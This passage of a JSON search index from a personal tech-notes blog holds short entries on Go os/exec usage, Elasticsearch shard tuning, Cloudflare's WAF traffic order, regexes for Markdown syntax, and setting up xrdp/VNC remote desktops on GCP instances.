style=\"color:#f92672\"\u003e:=\u003c/span\u003e append(\u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEnviron\u003c/span\u003e(), \u003cspan style=\"color:#a6e22e\"\u003eadditionalEnv\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecmd\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEnv\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003enewEnv\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecmd\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eCombinedOutput\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatalf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cmd.Run() failed with %s\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%s\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"在-linux-下使用-osexec--pipe-或-bash-運算式\"\u003e在 Linux 下使用 os/exec + Pipe 或 Bash 運算式\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ercmd\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e`iw dev | awk \u0026#39;$1==\u0026#34;Interface\u0026#34;{print $2}\u0026#39;`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecmd\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eexec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eCommand\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bash\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-c\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ercmd\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecmd\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eCombinedOutput\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"在-windows-下使用-osexec--batch-運算式\"\u003e在 Windows 下使用 os/exec + Batch 運算式\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecmd\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eexec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eCommand\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cmd\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/c\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ffmpeg -i myfile.mp4 myfile.mp3 \u0026amp;\u0026amp; del myfile.mp4\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecmd\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eCombinedOutput\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"解決-windows-cmd-在-osexec-時會出現本地語言的問題\"\u003e解決 Windows CMD 在 os/exec 時會出現本地語言的問題\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecmd\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eexec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eCommand\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cmd\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/c\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;chcp 65001 \u0026amp;\u0026amp; netsh WLAN show drivers\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecmd\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eCombinedOutput\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e使用此方法得出的 output string 請記得把回傳的首行（chcp 的回傳結果）刪除掉再進行其他處理和讀取。\u003c/p\u003e","tags":["URL","Go"],"title":"Golang os/exec 使用方法（筆記）"},{"categories":["URL","ELK","Elasticsearch"],"contents":" 喬叔教 Elastic - 30 - Elasticsearch 的優化技巧 (4/4) - Shard 的最佳化管理 規劃時建議要考量的項目 Search 在執行時，一個 Shard 會分配一個 Thread，數量太多反而會拖慢速度 一個 Node 依照不同的功能分類有多種 Thread pool， 其中 search (count/search/suggest) 的 size 是 int((# of allocated processors * 3) / 2) + 1 並且 queue_size 預設是 1000 ，而 write (index/delete/update/bulk) 的 size 是 # of allocated processors ，預設的 queue_size 也是 1000。( 官方文件 - Thread pools )\n大多數的 searching 在執行時，查詢的資料是會橫跨多個 shards，而每個 shard 在搜尋時會使用一個 CPU thread 在處理執行，也就是：\n如果有多個 shard，可以讓查詢的處理並發在多個 shard 身上同時進行，以增加處理的效率。 shard 數量愈多，node thread pool 的消耗也愈多，因此 thread pool 數量不足的話，反而會影響查詢的執行效率。 每個 Shard 都有基本運作的成本，數量太多成本愈高 指定 Shard 在 Cluster 中的分配方式，以優化儲存硬體的資源 刪除整批資料時，以 Index 為單位來刪除，而不要從一批 Documents 來刪除 Document 的刪除，在 Elasticsearch 的運作上，是產生另外一筆 \u0026ldquo;標示刪除\u0026rdquo; 的記錄在 segment files 中，所以這些都還是會持續的佔用系統資源，一直到 segment merge 之後，才會真正的被移除。\n因此如果會週期性的刪除一批舊資料時，最好能以 Index 為單位來刪除，而不是透過 delete_by_query 之類的批次刪除機制。\n建議使用 Data Stream 或 Index Lifecycle Management (ILM) 來管理 time series 資料 Index Lifecycle Management 裡面可以定義 自動 Rollover 的機制，也就是當資料量成長到 某個數量、某個時間、某個大小 時，會自動產生新的 Index 來放新的資料，而太舊的資料也能設定自動刪除。\n使用 ILM 是個很好來管理 Shard Strategy 的工具，因為他能很輕易的進行策略的調整：\n因為 ILM 都會透過 Index Template 來管理 Indices，所以要改變 primary shard 數量時，直接改 index template 即可。 想要 shard 總數成長慢一點、單一 shard 的大小要大一點時，只要修改 Rollover 的配置規則。 當 shard 數量太多、舊資料要刪掉時，只要修改 delete phase 的規則。 一般會建議讓單一 Shard 的大小在 10 ~ 50 GB 左右 1GB 的 Heap Memory 大約能處理 20 個 Shards 一個 node 能處理的 shard 數量大約會和 JVM heap memory 大小成一定的比例，以官方統計的數字，一般是每 GB 的 heap memory 大約可以處理 20 個 shards，也就是 30GB 的 heap memory 可以處理 600 個 shards，不過這同樣的還是要依照 Elasticsearch Cluster 的硬體規格與使用狀況來評估。\n若要查看 shard 數量，可以從 _cat API 來看 GET _cat/shards\n一個 Index 有多個 Shard 時，避免大多數的 Shard 都被分配在同一台 Node 身上 當我們將一個 Index 設定有多個 primary shard 時，主要的目的就是為了 indexing 時能有更多的 Nodes 能分擔處理，但一個 Cluster 可能有許多的 Index ，在各種混合分配的情況下，若是 shard allocation 的機制剛好把這個 Index 把 shard 分到同一個 Node 身上的話，這樣就達不到我們要的目的。\n因此可以透過 index.routing.allocation.total_shards_per_node 的設定，來限制每個 node 可以被分配存放這個 index 多少個 shard，設定方式如下：\nPUT /my-index-000001/_settings { \u0026#34;index\u0026#34; : { \u0026#34;routing.allocation.total_shards_per_node\u0026#34; : 5 } } 修正 oversharging (過多的 shards) Cluster 的方法 當 Cluster 已經因為太多的 shards 導致不太穩定時，我們可以透過以下的方式來進行調整或修正。\n使用較長時間區間的 time-based indices 配置方式 針對 time-based 資料，我們可以提高切 Index 的時間顆粒度，例如本來是 1 天 切一個 Index，我們可以改成 1 個月、或 1 年 來切 Index。\n如果是使用 Index Lifecycle Management 來處理 time-based indices 時，就可以透過提高 max_age, max_docs, max_size 的這些配置來達到同樣的目的。\n刪掉空的或沒必要的 Indices 在系統較不忙的時段，執行 Force Merge 來合併 Segment Files 透過 Shrink API 將現有的 Index 的 shard 數量變少 透過 reindex API 來合併較小的 indices 例如原先我們是以 日 來當作 time-based indices 的切割單位，若是 index 數量太多，因此造成 shard 數量太多，我們可以透過 reindex 的方式這些 indices 的資料合併到以 月 為單位的 index。\nPOST /_reindex { \u0026#34;source\u0026#34;: { \u0026#34;index\u0026#34;: \u0026#34;my-index-2099.10.*\u0026#34; }, \u0026#34;dest\u0026#34;: { \u0026#34;index\u0026#34;: \u0026#34;my-index-2099.10\u0026#34; } } ","date":"November 10, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211110-10253348/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10253348\" target=\"_blank\" rel=\"noopener\"\u003e喬叔教 Elastic - 30 - Elasticsearch 的優化技巧 (4/4) - Shard 的最佳化管理\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"規劃時建議要考量的項目\"\u003e規劃時建議要考量的項目\u003c/h4\u003e\n\u003ch5 id=\"search-在執行時一個-shard-會分配一個-thread數量太多反而會拖慢速度\"\u003eSearch 在執行時，一個 Shard 會分配一個 Thread，數量太多反而會拖慢速度\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003e一個 Node 依照不同的功能分類有多種 Thread pool， 其中 search (count/search/suggest) 的 size 是 \u003ccode\u003eint((# of allocated processors * 3) / 2) + 1\u003c/code\u003e 並且 queue_size 預設是 \u003ccode\u003e1000\u003c/code\u003e ，而 write (index/delete/update/bulk) 的 size 是 \u003ccode\u003e# of allocated processors\u003c/code\u003e ，預設的 queue_size 也是 \u003ccode\u003e1000\u003c/code\u003e。( 官方文件 - Thread pools )\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e大多數的 searching 在執行時，查詢的資料是會橫跨多個 shards，而每個 shard 在搜尋時會使用一個 CPU thread 在處理執行，也就是：\u003c/p\u003e","tags":["URL","ELK","Elasticsearch"],"title":"喬叔教 Elastic - 30 - Elasticsearch 的優化技巧 (4/4) - Shard 的最佳化管理"},{"categories":["Cloudflare","WAF","Network"],"contents":"Traffic sequence Traffic to your application runs through the following sequence on Cloudflare\u0026rsquo;s edge:\nDDoS URL Rewrites Page Rules IP Access Rules Bots Firewall Rules Rate Limiting Managed Rules Header Modification Access Workers ","date":"November 3, 2021","hero":"/images/hero/cloudflare.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211103-cloudflare-waf/","summary":"\u003ch3 id=\"traffic-sequence\"\u003eTraffic sequence\u003c/h3\u003e\n\u003cp\u003eTraffic to your application runs through the following sequence on Cloudflare\u0026rsquo;s edge:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eDDoS\u003c/li\u003e\n\u003cli\u003eURL Rewrites\u003c/li\u003e\n\u003cli\u003ePage Rules\u003c/li\u003e\n\u003cli\u003eIP Access Rules\u003c/li\u003e\n\u003cli\u003eBots\u003c/li\u003e\n\u003cli\u003eFirewall Rules\u003c/li\u003e\n\u003cli\u003eRate Limiting\u003c/li\u003e\n\u003cli\u003eManaged Rules\u003c/li\u003e\n\u003cli\u003eHeader Modification\u003c/li\u003e\n\u003cli\u003eAccess\u003c/li\u003e\n\u003cli\u003eWorkers\u003c/li\u003e\n\u003c/ol\u003e","tags":["Cloudflare","WAF","Network"],"title":"Cloudflare Traffic sequence"},{"categories":["URL","Markdown","Regex"],"contents":" Regex for Markdown Syntax basic-syntax # Headings headerOne = `(#{1}\\s)(.*)` headeTwo = `(#{2}\\s)(.*)` headerThree = `(#{3}\\s)(.*)` headerFour = `(#{4}\\s)(.*)` headerFive = `(#{5}\\s)(.*)` headerSix = `(#{6}\\s)(.*)` # Bold and Italic Text boldItalicText = `(\\*|\\_)+(\\S+)(\\*|\\_)+` # Links linkText = `(\\[.*\\])(\\((http)(?:s)?(\\:\\/\\/).*\\))` # Images imageFile = `(\\!)(\\[(?:.*)?\\])(\\(.*(\\.(jpg|png|gif|tiff|bmp))(?:(\\s\\\u0026#34;|\\\u0026#39;)(\\w|\\W|\\d)+(\\\u0026#34;|\\\u0026#39;))?\\)` # Unordered List listText = `(^(\\W{1})(\\s)(.*)(?:$)?)+` # Numbered Text numberedListText = `(^(\\d+\\.)(\\s)(.*)(?:$)?)+` # Block Quotes blockQuote = `((^(\\\u0026gt;{1})(\\s)(.*)(?:$)?)+` # Inline Code inlineCode = \u0026#34;(\\\\`{1})(.*)(\\\\`{1})\u0026#34; # Code Block codeBlock = \u0026#34;(\\\\`{3}\\\\n+)(.*)(\\\\n+\\\\`{3})\u0026#34; # Horizontal Line horizontalLine = `(\\=|\\-|\\*){3}` # Email Text emailText = `(\\\u0026lt;{1})(\\S+@\\S+)(\\\u0026gt;{1})` # TABLES tableText = `(((\\|)([a-zA-Z\\d+\\s#!@\u0026#39;\u0026#34;():;\\\\\\/.\\[\\]\\^\u0026lt;={$}\u0026gt;?(?!-))]+))+(\\|))(?:\\n)?((\\|)(-+))+(\\|)(\\n)((\\|)(\\W+|\\w+|\\S+))+(\\|$)` ","date":"October 29, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211029-regex-for-md/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://chubakbidpaa.com/interesting/2021/09/28/regex-for-md.html\" target=\"_blank\" rel=\"noopener\"\u003eRegex for Markdown Syntax\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.markdownguide.org/basic-syntax/\" target=\"_blank\" rel=\"noopener\"\u003ebasic-syntax\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# Headings\nheaderOne   = `(#{1}\\s)(.*)`\nheadeTwo    = `(#{2}\\s)(.*)`\nheaderThree = `(#{3}\\s)(.*)`\nheaderFour  = `(#{4}\\s)(.*)`\nheaderFive  = `(#{5}\\s)(.*)`\nheaderSix   = `(#{6}\\s)(.*)`\n\n# Bold and Italic Text\nboldItalicText   = `(\\*|\\_)+(\\S+)(\\*|\\_)+`\n\n# Links\nlinkText         = `(\\[.*\\])(\\((http)(?:s)?(\\:\\/\\/).*\\))`\n\n# Images\nimageFile        = `(\\!)(\\[(?:.*)?\\])(\\(.*(\\.(jpg|png|gif|tiff|bmp))(?:(\\s\\\u0026#34;|\\\u0026#39;)(\\w|\\W|\\d)+(\\\u0026#34;|\\\u0026#39;))?\\)`\n\n# Unordered List\nlistText         = `(^(\\W{1})(\\s)(.*)(?:$)?)+`\n\n# Numbered Text\nnumberedListText = `(^(\\d+\\.)(\\s)(.*)(?:$)?)+`\n\n# Block Quotes\nblockQuote       = `((^(\\\u0026gt;{1})(\\s)(.*)(?:$)?)+`\n\n# Inline Code\ninlineCode       = \u0026#34;(\\\\`{1})(.*)(\\\\`{1})\u0026#34;\n\n# Code Block\ncodeBlock        = \u0026#34;(\\\\`{3}\\\\n+)(.*)(\\\\n+\\\\`{3})\u0026#34;\n\n# Horizontal Line\nhorizontalLine   = `(\\=|\\-|\\*){3}`\n\n# Email Text\nemailText        = `(\\\u0026lt;{1})(\\S+@\\S+)(\\\u0026gt;{1})`\n\n# TABLES\ntableText        = `(((\\|)([a-zA-Z\\d+\\s#!@\u0026#39;\u0026#34;():;\\\\\\/.\\[\\]\\^\u0026lt;={$}\u0026gt;?(?!-))]+))+(\\|))(?:\\n)?((\\|)(-+))+(\\|)(\\n)((\\|)(\\W+|\\w+|\\S+))+(\\|$)`\n\u003c/code\u003e\u003c/pre\u003e","tags":["URL","Markdown","Regex"],"title":"Regex for Markdown Syntax"},{"categories":["URL","Linux","RDP"],"contents":" Google Cloud Platform(GCP): Access Linux Server using GUI running in GCP instance using Windows Remote Desktop Connection. # This will install GUI and make it as a default startup option and then restart the machine. $ sudo yum install xrdp tigervnc-server ~# sudo su ~# passwd ~# systemctl enable --now xrdp ~# netstat -antup | grep xrdp tcp 0 0 0.0.0.0:3389 0.0.0.0:* LISTEN 10202/xrdp tcp 0 0 127.0.0.1:3350 0.0.0.0:* LISTEN 10201/xrdp-sesman ","date":"October 20, 2021","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211020-google-cloud-platform-gcp-access-linux-server-using-gui-running-in-gcp-instance-using-windows/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/tech-guides/google-cloud-platform-gcp-access-linux-server-using-gui-running-in-gcp-instance-using-windows-201e315925a6\" target=\"_blank\" rel=\"noopener\"\u003eGoogle Cloud Platform(GCP): Access Linux Server using GUI running in GCP instance using Windows Remote Desktop Connection.\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# This will install GUI and make it as a default startup option and then restart the machine.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo yum install xrdp tigervnc-server\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# sudo su\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# passwd\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# systemctl enable --now xrdp\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# netstat -antup | grep xrdp\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etcp        \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e      \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e 0.0.0.0:3389            0.0.0.0:*               LISTEN      10202/xrdp\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etcp        \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e      \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e 127.0.0.1:3350          0.0.0.0:*               LISTEN      10201/xrdp-sesman\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","RDP"],"title":"Google Cloud Platform(GCP): Access Linux Server using GUI running in GCP instance using Windows Remote Desktop Connection."},{"categories":["URL","Linux","VNC"],"contents":" 【筆記】在 GCP 上建立可 Remote dekstop 的 Ubuntu 環境 install # dependency sudo apt-get install ubuntu-desktop gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal # VNC Server sudo apt-get install vnc4server # 安裝完成後先執行vncserver，會先跳出password設定的選項 vncserver modify ~/.vnc/xstartup #!/bin/sh # Uncomment the following two lines for normal desktop: # unset SESSION_MANAGER # exec /etc/X11/xinit/xinitrc [ -x /etc/vnc/xstartup ] \u0026amp;\u0026amp; exec /etc/vnc/xstartup [ -r $HOME/.Xresources ] \u0026amp;\u0026amp; xrdb $HOME/.Xresources xsetroot -solid grey vncconfig -iconic \u0026amp; x-terminal-emulator -geometry 80x24+10+10 -ls -title \u0026#34;$VNCDESKTOP Desktop\u0026#34; \u0026amp; x-window-manager \u0026amp; gnome-panel \u0026amp; gnome-settings-daemon \u0026amp; metacity \u0026amp; nautilus \u0026amp; exec # 殺掉目前執行的vncserver 然後重新執行 vncserver -kill :1 # vncserver預設是執行在port 5900上，如果在後面加上：1 就是5901以此類推 vncserver :1 設定 reboot 的時候自動執行 vncserver @reboot /usr/bin/vncserver :1 ","date":"October 20, 2021","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211020-gcp-remote-desktop/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/@huiqinng/%E7%AD%86%E8%A8%98-%E5%9C%A8gcp%E4%B8%8A%E5%BB%BA%E7%AB%8B%E5%8F%AFremote-dekstop%E7%9A%84ubuntu%E7%92%B0%E5%A2%83-e56fdbd3a4f2\" target=\"_blank\" rel=\"noopener\"\u003e【筆記】在 GCP 上建立可 Remote dekstop 的 Ubuntu 環境\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"install\"\u003einstall\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# dependency\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt-get install ubuntu-desktop gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# VNC Server\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt-get install vnc4server\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 